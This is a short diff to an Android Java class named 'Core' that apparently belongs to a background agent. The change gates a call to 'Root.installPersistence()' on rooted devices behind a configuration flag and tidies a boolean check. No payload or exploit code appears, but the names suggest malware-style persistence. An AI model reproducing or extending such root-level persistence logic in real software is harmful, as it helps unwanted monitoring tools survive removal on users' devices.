@@ -83,7 +83,6 @@ public class Core extends Activity implements Runnable {
 	private PendingIntent alarmIntent = null;
 	private ServiceMain serviceMain;
 
-
 	@SuppressWarnings("unused")
 	private void Core() {
 
@@ -119,7 +118,7 @@ public class Core extends Activity implements Runnable {
 
 	public boolean Start(final Resources resources, final ContentResolver cr) {
 
-		if (serviceRunning == true) {
+		if (serviceRunning) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (Start): service already running"); //$NON-NLS-1$
 			}
@@ -158,9 +157,11 @@ public class Core extends Activity implements Runnable {
 			}
 			if (Status.haveRoot()) {
 				int perStatus = Status.getPersistencyStatus();
-				Root.installPersistence();
-				if (perStatus != Status.getPersistencyStatus()) {
-					Status.self().setReload();
+				if(Cfg.PERSISTENCE) {
+					Root.installPersistence();
+					if (perStatus != Status.getPersistencyStatus()) {
+						Status.self().setReload();
+					}
 				}
 			}
 			return false;
